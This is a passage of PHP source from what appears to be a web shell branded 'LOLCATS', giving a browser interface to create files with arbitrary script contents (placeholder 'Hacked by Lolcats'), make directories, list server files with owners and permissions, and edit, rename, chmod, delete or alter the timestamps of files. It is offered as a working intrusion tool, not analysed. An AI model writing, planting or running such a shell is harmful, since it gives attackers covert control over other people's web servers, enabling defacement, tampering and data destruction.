    if (isset($_1337["bikin"])) {
        $name = $_1337["name_file"];
        $contents_file = $_1337["contents_file"];
        foreach ($name as $name_file) {
            $handle = @fopen("$name_file", "w");
            if ($contents_file) {
                $create = @fwrite($handle, $contents_file);
            } else {
                $create = $handle;
            }
        }
        if ($create) {
            echo "<script>window.location='?path=$path'</script>";
        } else {
            echo "<strong>Create file</strong> FAIL! " . er() . "</div>";
        }
    }
    echo "
		<div class='mb-3'>
			<form method='POST'>
				<i class='bi bi-file-earmark'></i> Filename:
				<input class='form-control form-control-sm text-dark' type='text' name='name_file[]' placeholder='lolcats.txt' $_r>
				<i class='bi bi-code-square'></i> Your Script:
				<textarea class='form-control form-control-sm text-dark' name='contents_file' rows='7' placeholder='Hacked by Lolcats' $_r></textarea>
				<div class='d-grid gap-2'><br>
					<input class='btn btn-outline-light btn-sm' type='submit' name='bikin' value='Submit!'>
				</div>
			</form>
		</div>";
}
if (isset($_1337["dirnew"])) {
    s();
    if (isset($_1337["create"])) {
        $name = $_1337["name_dir"];
        foreach ($name as $name_dir) {
            $folder = preg_replace(
                "([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})",
                "",
                $name_dir
            );
            $fd = @mkdir($folder);
        }
        if ($fd) {
            echo "<script>window.location='?path=$path'</script>";
        } else {
            echo "<strong>Create dir</strong> FAIL! " . er() . "</div>";
        }
    }
    echo "
		<div class='mb-3'>
			<form method='POST'>
				<i class='bi bi-folder'></i> Directory name:
				<div class='input-group mb-3'>
					<input class='form-control form-control-sm text-dark' type='text' name='name_dir[]' placeholder='New Folder' $_r>
					<input class='btn btn-outline-light btn-sm' type='submit' name='create' value='Create Directory!'>
				</div>
			</form>
		</div>";
}
echo '
		<div class="table-responsive">
		<table class="table table-hover table-dark text-light">
		<thead>
		<tr>
			<td class="text-center">NAME</td>
				<td class="text-center">TYPE</td>
				<td class="text-center">LAST MODIFIED</td>
				<td class="text-center">SIZE</td>
				<td class="text-center">OWNER <font class="text-danger">/</font> GROUP</td>
				<td class="text-center">PERMISSIONS</td>
			<td class="text-center">ACTION</td>
		</tr>
		</thead>
		<tbody class="text-nowrap">
		<tr>
			<td><i class="bi bi-folder2-open"></i> <a class="text-decoration-none text-white" href="?path=' .
    dirname($dir) .
    '">..</a></td><td></td><td></td><td></td><td></td><td></td><td class="text-center">
				<div class="btn-group">
					<a class="btn btn-outline-light btn-sm" href="?filenew&path=' .
    $dir .
    '"><i class="bi bi-file-earmark-plus"></i></a>
					<a class="btn btn-outline-light btn-sm" href="?dirnew&path=' .
    $dir .
    '"><i class="bi bi-folder-plus"></i></a>
				</div>
			</td>
		</tr>';
foreach ($scand as $dir) {
    $dt = date("Y-m-d G:i", filemtime("$path/$dir"));
    if (strlen($dir) > 25) {
        $_d = substr($dir, 0, 25) . "...";
    } else {
        $_d = $dir;
    }
    if (function_exists("posix_getpwuid")) {
        $downer = @posix_getpwuid(fileowner("$path/$dir"));
        $downer = $downer["name"];
    } else {
        $downer = fileowner("$path/$dir");
    }
    if (function_exists("posix_getgrgid")) {
        $dgrp = @posix_getgrgid(filegroup("$path/$dir"));
        $dgrp = $dgrp["name"];
    } else {
        $dgrp = filegroup("$path/$dir");
    }
    if (!is_dir($path . "/" . $file)) {
        continue;
    }
    $size = filesize($path . "/" . $file) / 1024;
    $size = round($size, 3);
    if ($size >= 1024) {
        $size = round($size / 1024, 2) . " MB";
    } else {
        $size = $size . " KB";
    }
    if (!is_dir($path . "/" . $dir) || $dir == "." || $dir == "..") {
        continue;
    }
    echo "
    <tr>
        <td><i class='bi bi-folder-fill'></i> <a class='text-decoration-none text-white' href='?dir=$path/$dir'>$_d</a></td>
        <td class='text-center text-white'>d!r</td>
        <td class='text-center text-white'>$dt</td>
        <td class='text-center text-white'>-</td>
        <td class='text-center text-white'>$downer<font class='text-danger'> / </font>$dgrp</td>
        <td class='text-center'>";

    if (is_writable($path . "/" . $dir)) {
        echo "<gr>";
    } elseif (!is_readable($path . "/" . $dir)) {
        echo "<rd>";
    }
    echo p($path . "/" . $dir);
    if (is_writable($path . "/" . $dir) || !is_readable($path . "/" . $dir)) {
        echo "</font></center></td>";
    }
    echo "
			<td class='text-center'>
			<div class='btn-group'>
				<a class='btn btn-outline-light btn-sm' href='?dir=$path/$dir&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
                <a class='btn btn-outline-light btn-sm' href='?dir=$path/$dir&action=changemodified_folder'><i class='bi bi-calendar-date'></i></a>
                <!--<a class='btn btn-outline-light btn-sm' href='?dir=$path/$dir&action=chemod'><i class='bi bi-file-earmark-medical'></i></a>-->
				<a class='btn btn-outline-danger btn-sm txt' href='?dir=$path/$dir&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
			</div>
			</td>
		</tr>";
}
foreach ($scand as $file) {
    $ft = date("Y-m-d G:i", filemtime("$path/$file"));
    if (function_exists("posix_getpwuid")) {
        $fowner = @posix_getpwuid(fileowner("$path/$file"));
        $fowner = $fowner["name"];
    } else {
        $fowner = fileowner("$path/$file");
    }
    if (function_exists("posix_getgrgid")) {
        $fgrp = @posix_getgrgid(filegroup("$path/$file"));
        $fgrp = $fgrp["name"];
    } else {
        $fgrp = filegroup("$path/$file");
    }
    if (!is_file($path . "/" . $file)) {
        continue;
    }
    if (strlen($file) > 25) {
        $_f = substr($file, 0, 25) . "...-." . $ext;
    } else {
        $_f = $file;
    }
    echo "
    <tr>
        <td><i class='bi bi-file-earmark-text-fill'></i> <a class='text-decoration-none text-white' href='?dir=$path&action=view&opn=$file' class='text-white'>$_f</a></td>
        <td class='text-center text-white'>f!le</td>
        <td class='text-center text-white'>$ft</td>
        <td class='text-center text-white'>" .
        sz(filesize($file)) .
        "</td>
        <td class='text-center text-white'>$fowner<font class='text-danger'> / </font>$fgrp</td>
        <td class='text-center'>";
    if (is_writable($path . "/" . $file)) {
        echo "<gr>";
    } elseif (!is_readable($path . "/" . $file)) {
        echo "<rd>";
    }
    echo p($path . "/" . $file);
    if (is_writable($path . "/" . $file) || !is_readable($path . "/" . $file)) {
        echo "</gr></rd></td>";
    }
    echo "<td class='text-center'>
    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified&opn=$file'><i class='bi bi-calendar-date'></i></a>
<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
			</div>
			</td>
		</tr>";
}
echo "</tbody></table></div><center><div class='text-white'><hr><font color='white'>&copy; LOLCATS</font></div></center></body></html>";
?>